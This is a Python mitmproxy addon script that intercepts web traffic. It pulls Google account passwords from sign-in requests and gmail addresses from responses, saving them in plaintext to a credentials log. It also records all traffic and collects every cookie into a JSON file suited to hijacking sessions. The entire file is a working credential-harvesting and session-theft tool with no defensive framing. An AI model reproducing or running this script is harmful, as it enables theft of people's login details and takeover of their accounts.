from mitmproxy import http
import json
import urllib.parse
import re

CREDS_FILE = "google_credentials.log"
LOG_FILE = "traffic_full.log"
COOKIES_FILE = "cookies_google.json"
captured_cookies = []



def log_to_file(entry, filename=LOG_FILE):
    with open(filename, "a", encoding="utf-8") as f:
        json.dump(entry, f, ensure_ascii=False)
        f.write("\n")

def save_credentials(username, password):
    with open(CREDS_FILE, "a", encoding="utf-8") as f:
        f.write(f"username={username} | password={password}\n")
    print(f"[INFO] Credenziali salvate: {username} / {password}")

def extract_google_credentials(flow: http.HTTPFlow):
    if "accounts.google.com" in flow.request.url:
        try:
            body = flow.request.content.decode(errors="ignore")
            qs = urllib.parse.parse_qs(body)
            f_req = qs.get("f.req", [""])[0]
            decoded = urllib.parse.unquote(f_req)
            
            password_match = re.search(r'\[\\\"(.*?)\\\",null,1\]', decoded)
            password = password_match.group(1) if password_match else "0"

            if flow.response.content:
            	body = flow.response.content.decode(errors="ignore")
            	body = body.split("\n", 1)[-1]  
            	m_user = re.search(r'([a-zA-Z0-9._%+-]+@gmail\.com)', body)
            	if m_user:
            		username = m_user.group(1)

            if username and password:
                save_credentials(username, password)

        except Exception as e:
            print(f"[ERROR] Errore nell'estrazione: {e}")


def save_cookie_json(domain, name, value):
    for c in captured_cookies:
        if c["name"] == name and c["domain"] == f".{domain}":
            return
    
    captured_cookies.append({
        "domain": f".{domain}",
        "name": name,
        "value": value,
        "path": "/",
        "secure": True
    })
    
    with open(COOKIES_FILE, "w", encoding="utf-8") as f:
        json.dump(captured_cookies, f, indent=2)
    print(f"[COOKIE SALVATO] {name}={value}")



def extract_cookies(flow):
    if "set-cookie" in flow.response.headers:
        cookies = flow.response.headers.get_all("set-cookie")
        for c in cookies:
            # Nome e valore
            parts = c.split(";")[0].split("=")
            if len(parts) == 2:
                name, value = parts
                save_cookie_json(flow.request.host, name.strip(), value.strip())



def request(flow: http.HTTPFlow):
    entry = {
        "type": "request",
        "url": flow.request.url,
        "method": flow.request.method,
        "headers": dict(flow.request.headers),
        "body": flow.request.content.decode(errors="ignore") if flow.request.content else ""
    }
    log_to_file(entry)
    extract_google_credentials(flow)

def response(flow: http.HTTPFlow):
    entry = {
        "type": "response",
        "url": flow.request.url,
        "status": flow.response.status_code,
        "headers": dict(flow.response.headers),
        "body": flow.response.content.decode(errors="ignore") if flow.response.content else ""
    }
    log_to_file(entry)
    extract_google_credentials(flow)
    extract_cookies(flow)
    
